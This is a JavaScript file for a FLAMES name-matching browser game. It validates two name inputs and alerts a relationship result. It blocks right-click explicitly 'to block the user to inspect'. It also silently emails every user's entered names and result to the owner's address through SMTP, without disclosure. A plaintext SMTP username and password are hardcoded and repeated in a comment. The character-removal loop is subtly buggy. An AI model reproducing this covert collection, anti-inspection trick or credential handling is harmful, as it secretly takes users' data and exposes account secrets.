//* the below code for access the Html tags:
let boyName = document.getElementById('boyName');
let girlName = document.getElementById('girlName');
let err1 = document.getElementById('error1');
let err2 = document.getElementById('error2');
let submitBtn = document.getElementById('submitBtn');
let c = 1;

//* this code for block the user or client to inspect:
const div = document;
div.addEventListener("contextmenu", (e) => { e.preventDefault() });
//* condition1 & 2 functions works while the user enter the details show the error:
function condition1(e) {
  e.preventDefault();
  if (/\s/.test(boyName.value)) {
    boyName.style.borderColor = 'red';
    err1.innerHTML = `Space Not Allowed!`
    err1.style.visibility = 'visible';
    c = 0;
    console.log(c);
  } else if (/[0-9]/g.test(boyName.value)) {
    boyName.style.borderColor = 'red';
    err1.innerHTML = `Number Not Allowed!`
    err1.style.visibility = 'visible';
    c = 0;
  } else if (/[\!\@\#\$\%\^\&\*\)\(\+\=\.\\\/\?\,\<\>\{\}\[\]\:\;\'\"\|\~\`\_\-]/g.test(boyName.value)) {
    boyName.style.borderColor = 'red';
    err1.innerHTML = `special character Not Allowed!`
    err1.style.visibility = 'visible';
    c = 0;
  } else {
    boyName.style.borderColor = 'green';
    err1.style.visibility = 'hidden';
    c = 1;
  }

}
function condition2(e) {
  e.preventDefault();
  if (/\s/.test(girlName.value)) {
    girlName.style.borderColor = 'red';
    err2.innerHTML = `Space Not Allowed!`
    err2.style.visibility = 'visible';
    c = 0;
  } else if (/[\!\@\#\$\%\^\&\*\)\(\+\=\.\\\/\?\,\<\>\{\}\[\]\:\;\'\"\|\~\`\_\-]/g.test(girlName.value)) {
    girlName.style.borderColor = 'red';
    err2.innerHTML = `special character Not Allowed!`
    err2.style.visibility = 'visible';
    c = 0;
  } else if (/[0-9]/g.test(girlName.value)) {
    girlName.style.borderColor = 'red';
    err2.innerHTML = `Number Not Allowed!`
    err2.style.visibility = 'visible';
    c = 0;
  } else {
    girlName.style.borderColor = 'green';
    err2.style.visibility = 'hidden';
    c = 1;
  }
}
function checkUserEnteredData(e) {
  e.preventDefault();
  console.log(c);
  c ? findLnOfpairs() : sendBtnErrorMsg();
}
function sendBtnErrorMsg() {
  alert('Enter Valid Data');
}

function findLnOfpairs(e) {

  //* get the user data from html file:
  let boyName = document.getElementById('boyName').value;
  let girlName = document.getElementById('girlName').value;

  //*convert string to array as well as split the charactor
  let boy = boyName.split('')
  let girl = girlName.split('');


  //* this loop for remove the duplicate value from boyName and girlName:
  for (let b in boy) {
    for (let g in girl) {
      if (boy[b] === girl[g]) {
        boy.splice(b, 1)
        girl.splice(g, 1)
      }
    }
  }
  //*Remaining value of the boyName and girlName:
  const totalValue = boy.concat(girl);

  //* Original Array:
  let array = ['F', 'L', 'A', 'M', 'E', 'S'];
  let count = totalValue.length;
  let n = count;
  //* loop for iterate element & remove element based on count value:
  for (let i = 0; i < count; i++) {
    let index = i % array.length; // Use modulo to cycle through the array
    const element = array[index];
    if (i == count - 1) {
      let remove = array.splice(index, 1);
      i = index - 1;
      count = index + n;
    }
    if (array.length === 1) {
      break;
    }
  }
  //* converting array to single string:
  array = array.toString();

  console.log(array);
  switch (array) {
    case "F":
      alert('Friendship');
      break;
    case "L":
      alert('Love')
      break;
    case "A":
      alert('Affection')
      break;
    case "M":
      alert('Marriage')
      break;
    case "E":
      alert('Enemy')
      break;
    default:
      alert('Siblings');
      break;
  }
  let res = `
boyName : ${boyName} <br/>
girlName : ${girlName} <br/>
result : ${array}`
  //* this code will send to owner user entered value :
  Email.send({
    // SecureToken:'657327f5-e91b-4225-a428-157ecf74a1b0',
    Host: "smtp.elasticemail.com",
    Username: "naveennaveen638583@gmail.com",
    Password: "D3993A017F30F70794FB3A4B955EB38B7B40",
    To: 'naveennaveen638583@gmail.com',
    From: "naveennaveen638583@gmail.com",
    Subject: "Flames Project Data",
    Body: res,
  }).then(
    message =>  location.reload()
  );
};


// password: D3993A017F30F70794FB3A4B955EB38B7B40

